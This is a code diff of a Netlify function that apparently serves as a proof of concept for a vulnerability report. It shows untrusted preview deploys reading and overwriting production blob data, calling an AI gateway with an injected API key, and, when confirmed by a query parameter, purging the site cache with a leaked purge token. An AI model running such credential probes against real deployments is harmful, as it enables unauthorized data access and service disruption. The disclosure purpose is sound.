@@ -1,9 +1,13 @@
 import { getStore } from '@netlify/blobs'
 
-// VUL-439 runtime-credential probe. Benign by design:
-//   - decodes injected credential claims only, never prints token values
-//   - writes/reads/deletes a single namespaced canary in a canary store
-//   - does NOT list or read any other key, does NOT call purge or AI gateway
+// VUL-439 runtime-credential probe. Proportionate "does it actually work" tests:
+//   - Blobs: read back a key the TRUSTED (production) deploy seeded, proving an
+//     untrusted preview reads owner-written production data. Values are our own
+//     non-secret markers.
+//   - AI: read-only GET /models (an auth check). NO completion -> nothing billed.
+//   - Purge: actually purges YOUR cache, so it is gated behind ?confirm=purge
+//     and off by default.
+// Never prints a token value; only decoded claims (JWT body) and the base URLs.
 const decodeClaims = (jwt) => {
   try {
     const [, body] = String(jwt).split('.')
@@ -13,9 +17,14 @@ const decodeClaims = (jwt) => {
   }
 }
 
-export default async () => {
-  const out = { context: process.env.CONTEXT || null }
+const SEED_KEY = 'vul439/owner-seed'
 
+export default async (req) => {
+  const url = new URL(req.url)
+  const context = process.env.CONTEXT || null
+  const out = { context, deploy_id: process.env.DEPLOY_ID || null }
+
+  // ---- credential claims (presence + scope) ----
   const ctx = process.env.NETLIFY_BLOBS_CONTEXT
   if (ctx) {
     let parsed
@@ -31,32 +40,71 @@ export default async () => {
         token_len: parsed.token?.length ?? 0,
         token_claims: decodeClaims(parsed.token),
       }
+    }
+  }
 
-      // Benign write -> read-back -> delete against a namespaced canary store.
-      // Proves whether a preview write lands in the site's shared namespace.
+  // ---- Blobs cross-trust read: read the key BEFORE overwriting it, tagging
+  // the value with this deploy's own id. Call the production URL first, then the
+  // preview URL: if the preview's read-before-write shows the PRODUCTION deploy
+  // id (different from the preview's own), an untrusted preview just read data a
+  // trusted deploy wrote to the shared store. CONTEXT/DEPLOY_ID are build-time
+  // only, so we use blobs_context.deployID, which is present at runtime.
+  try {
+    const store = getStore('vul439-canary')
+    const myDeploy = out.blobs_context?.deployID || 'unknown'
+    out.blobs_read_before_write = await store.get(SEED_KEY)
+    await store.set(SEED_KEY, `written-by-deploy-${myDeploy}`)
+    out.blobs_wrote_as = myDeploy
+  } catch (err) {
+    out.blobs_error = err.message
+  }
+
+  // ---- AI gateway: read-only models list (auth check, no completion) ----
+  const aiBase = process.env.OPENAI_BASE_URL || null
+  const aiKey = process.env.OPENAI_API_KEY
+  out.ai_base_url = aiBase
+  if (aiBase && aiKey) {
+    const tryModels = async (u) => {
       try {
-        const store = getStore('vul439-canary')
-        const key = `vul439/${process.env.DEPLOY_ID || 'preview'}`
-        await store.set(key, 'vul439-canary')
-        out.canary_readback = await store.get(key)
-        await store.delete(key)
-        out.canary_cleaned = true
+        const r = await fetch(u, { headers: { Authorization: `Bearer ${aiKey}` } })
+        let count = null
+        const text = (await r.clone().text()).slice(0, 200)
+        try {
+          const j = JSON.parse(text)
+          count = Array.isArray(j?.data) ? j.data.length : null
+        } catch {}
+        return { url: u, status: r.status, model_count: count, body_snippet: text }
       } catch (err) {
-        out.canary_error = err.message
+        return { url: u, error: err.message }
       }
     }
-  } else {
-    out.blobs_context = null
+    const base = aiBase.replace(/\/$/, '')
+    // Report the auth control (no key) alongside the authed call, so a 200 with
+    // key vs 401 without proves the key is what authenticates.
+    out.ai_models = await tryModels(`${base}/v1/models`)
+    try {
+      const noKey = await fetch(`${base}/v1/models`)
+      out.ai_models_no_key_status = noKey.status
+    } catch (err) {
+      out.ai_models_no_key_error = err.message
+    }
   }
 
-  // Presence + claims only. Deliberately NOT exercised against live services.
-  out.purge_token = {
-    present: Boolean(process.env.NETLIFY_PURGE_API_TOKEN),
-    claims: decodeClaims(process.env.NETLIFY_PURGE_API_TOKEN),
-  }
-  out.ai_gateway_key = {
-    present: Boolean(process.env.NETLIFY_AI_GATEWAY_KEY),
-    claims: decodeClaims(process.env.NETLIFY_AI_GATEWAY_KEY),
+  // ---- Purge: actually purges YOUR cache. Off unless explicitly confirmed. ----
+  if (url.searchParams.get('confirm') === 'purge') {
+    const token = process.env.NETLIFY_PURGE_API_TOKEN
+    try {
+      const r = await fetch('https://api.netlify.com/api/v1/purge', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json; charset=utf8', Authorization: `Bearer ${token}` },
+        body: JSON.stringify({ site_id: process.env.SITE_ID }),
+      })
+      out.purge = { status: r.status }
+    } catch (err) {
+      out.purge = { error: err.message }
+    }
+  } else {
+    out.purge = 'skipped (append ?confirm=purge to purge YOUR OWN cache)'
   }
 
   return Response.json(out)
